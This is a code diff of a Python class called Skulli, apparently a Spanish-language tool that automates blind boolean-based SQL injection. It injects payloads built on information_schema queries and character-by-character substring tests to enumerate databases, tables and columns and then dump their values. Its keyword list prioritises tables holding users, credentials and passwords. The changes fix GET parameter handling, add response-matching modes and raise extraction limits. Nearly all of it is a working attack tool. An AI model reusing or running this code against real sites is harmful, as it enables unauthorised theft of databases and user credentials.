@@ -49,27 +49,30 @@ class Skulli:
         self.characters = string.ascii_letters + string.digits + '_-$#@!.,<>?;:* '
         self.old_data = self.data[self.skll]
         
-    def create_log(self,header,logs):
+    def create_log(self,header,logs,separator=','):
+        print(separator)
         log_name = f'{self.log}.txt'
         if path.exists(log_name) and header == 'Databases':
             remove(log_name)
         try:
             with open(log_name, 'a') as skll_log:
-                parse_logs = logs.replace(',', '\n')
+                parse_logs = logs.replace(separator, '\n')
                 skll_log.write(f"{header}:\n\n{parse_logs}")
         except Exception as e:
             print(e)
         
     def set_options(self,options):
         list_options = options.split(',')
-        good_words = ['users', 'login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales']
+        lower_options = [word.lower() for word in list_options]
+        good_words = ['users', 'login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales', 'usernames', 'username', 'password', 'id']
         
         if len(options) == 1:
             return 0
         
         for word in good_words:
-            if word in options:
-                index = list_options.index(word)
+            if word in lower_options:
+                index = lower_options.index(word)
+                good_words.pop(index)
                 return index
         return self.which_options(options)
 
@@ -94,9 +97,8 @@ class Skulli:
         return select_option
 
     def length_value(self, length):
-        if length == None:
+        if length == None and not self.automatic:
             print('Ocurrio un error a la hora de la inyeccion, puede que no tenga permisos para leer esa base de datos/tabla/columna.')
-            sys.exit(1)
 
     def condition_of_request(self, match):
         if match.isdigit():
@@ -120,7 +122,7 @@ class Skulli:
     def get_databases_len(self):
         ln = None
         condition = self.condition_of_request(self.match)
-
+        
         for i in range(1,200):
             length = f"' or length((select group_concat(schema_name) from information_schema.schemata))={i}-- -"
             self.data[self.skll] += length
@@ -128,7 +130,7 @@ class Skulli:
             if self.method == 'post':
                 r = requests.post(self.url, data=self.data, headers=self.headers)
             else:
-                 r = requests.get(self.url, data=self.data, headers=self.headers)
+                 r = requests.get(self.url,params=self.data ,headers=self.headers)
             self.data[self.skll] = self.old_data
             if condition == 'status_code':
                 if r.status_code != self.match:
@@ -150,6 +152,9 @@ class Skulli:
     def get_databases(self,db_len):
         databases = ''
         p2 = log.progress('Databases')
+        condition = self.condition_of_request(self.match)
+        # proxy = {"http": "http://127.0.0.1:8080"}
+
 
         for pos in range(1,db_len + 1):
             for char in self.characters:
@@ -159,13 +164,27 @@ class Skulli:
                 if self.method == 'post':
                     r = requests.post(self.url, data=self.data, headers=self.headers)
                 else:
-                    r = requests.get(self.url, data=self.data, headers=self.headers)
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
 
                 self.data[self.skll] = self.old_data
-                if self.match not in r.text:
-                    databases += char
-                    p2.status(databases)
-                    break
+                if condition == 'status_code':
+                    if r.status_code != self.match:
+                        databases += char
+                        p2.status(databases)
+                        break
+                else:
+                    
+                    if condition == 'not in':    
+                        if self.match not in r.text:
+                            databases += char
+                            p2.status(databases)
+                            break
+                    else:
+                        if self.match in r.text:
+                            databases += char
+                            p2.status(databases)
+                            break
+                            
         self.data[self.skll] = self.old_data
 
         if self.log:
@@ -183,7 +202,7 @@ class Skulli:
             if self.method == 'post':
                 r = requests.post(self.url, data=self.data, headers=self.headers)
             else:
-                 r = requests.get(self.url, data=self.data, headers=self.headers)
+                 r = requests.get(self.url, params=self.data, headers=self.headers)
             self.data[self.skll] = self.old_data
             if condition == 'status_code':
                 if r.status_code != self.match:
@@ -205,6 +224,7 @@ class Skulli:
     def get_tables(self, tb_len, db):
         tables = ''
         p2 = log.progress(f'Tables ({db})')
+        condition = self.condition_of_request(self.match)
 
         for pos in range(1,tb_len + 1):
             for char in self.characters:
@@ -214,13 +234,25 @@ class Skulli:
                 if self.method == 'post':
                     r = requests.post(self.url, data=self.data, headers=self.headers)
                 else:
-                    r = requests.get(self.url, data=self.data, headers=self.headers)
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
 
                 self.data[self.skll] = self.old_data
-                if self.match not in r.text:
-                    tables += char
-                    p2.status(tables)
-                    break
+                if condition == 'status_code':
+                    if r.status_code != self.match:
+                        tables += char
+                        p2.status(tables)
+                        break
+                else:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            tables += char
+                            p2.status(tables)
+                            break
+                    else:
+                        if self.match in r.text:
+                            tables += char
+                            p2.status(tables)
+                            break
         self.data[self.skll] = self.old_data
 
         if self.log:
@@ -231,14 +263,14 @@ class Skulli:
         ln = None
         condition = self.condition_of_request(self.match)
 
-        for i in range(1,200):
+        for i in range(1,500):
             length = f"' or length((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'))={i}-- -"
             self.data[self.skll] += length
             
             if self.method == 'post':
                 r = requests.post(self.url, data=self.data, headers=self.headers)
             else:
-                 r = requests.get(self.url, data=self.data, headers=self.headers)
+                 r = requests.get(self.url, params=self.data, headers=self.headers)
             self.data[self.skll] = self.old_data
             if condition == 'status_code':
                 if r.status_code != self.match:
@@ -261,6 +293,7 @@ class Skulli:
     def get_columns(self, cl_len, db, table):
         columns = ''
         p2 = log.progress(f'Columns ({db})->({table})')
+        condition = self.condition_of_request(self.match)
 
         for pos in range(1,cl_len + 1):
             for char in self.characters:
@@ -270,13 +303,25 @@ class Skulli:
                 if self.method == 'post':
                     r = requests.post(self.url, data=self.data, headers=self.headers)
                 else:
-                    r = requests.get(self.url, data=self.data, headers=self.headers)
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
 
                 self.data[self.skll] = self.old_data
-                if self.match not in r.text:
-                    columns += char
-                    p2.status(columns)
-                    break
+                if condition == 'status_code':
+                    if r.status_code != self.match:
+                        columns += char
+                        p2.status(columns)
+                        break
+                else:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            columns += char
+                            p2.status(columns)
+                            break
+                    else:
+                        if self.match in r.text:
+                            columns += char
+                            p2.status(columns)
+                            break
         self.data[self.skll] = self.old_data
 
         if self.log:
@@ -287,14 +332,14 @@ class Skulli:
         ln = None
         condition = self.condition_of_request(self.match)
 
-        for i in range(1,300):
+        for i in range(1,5000):
             length = f"' or char_length((select group_concat({columns}) from {db}.{table}))={i}-- -"
             self.data[self.skll] += length
             
             if self.method == 'post':
                 r = requests.post(self.url, data=self.data, headers=self.headers)
             else:
-                 r = requests.get(self.url, data=self.data, headers=self.headers)
+                 r = requests.get(self.url, params=self.data, headers=self.headers)
             self.data[self.skll] = self.old_data
             if condition == 'status_code':
                 if r.status_code != self.match:
@@ -318,26 +363,52 @@ class Skulli:
         values = ''
         parse_columns = columns.replace(',0x3a,', ',')
         p2 = log.progress(f'Values ({db})->({table})->({parse_columns})')
+        condition = self.condition_of_request(self.match)
+        separator = ' ^$@ '
+        
+        if vl_len > 200:
+            p2.status('Muchos datos, exporte a un archivo para ver')
 
         for pos in range(1,vl_len + 1):
             for char in self.characters:
-                payload = f"' or binary substring((select group_concat({columns}) from {db}.{table}),{pos},1)='{char}'-- -"
+                payload = f"' or binary substring((select group_concat({columns} separator '{separator}') from {db}.{table}),{pos},1)='{char}'-- -"
                 self.data[self.skll] += payload
 
                 if self.method == 'post':
                     r = requests.post(self.url, data=self.data, headers=self.headers)
                 else:
-                    r = requests.get(self.url, data=self.data, headers=self.headers)
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
 
                 self.data[self.skll] = self.old_data
-                if self.match not in r.text:
-                    values += char
-                    p2.status(values)
-                    break
+                if condition == 'status_code':
+                    if r.status_code != self.match:
+                        values += char
+                        if vl_len > 200:
+                            break
+                        else:
+                            p2.status(values)
+                            break
+                else:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            values += char
+                            if vl_len > 200:
+                                break
+                            else:
+                                p2.status(values)
+                                break
+                    else:
+                        if self.match in r.text:
+                            values += char
+                            if vl_len > 200:
+                                break
+                            else:
+                                p2.status(values)
+                                break
         self.data[self.skll] = self.old_data
 
         if self.log:
-            self.create_log('\n\nValues', values)
+            self.create_log('\n\nValues', values, separator)
 
     def initial(self):
         p1 = print('[+] Iniciando SkullI')
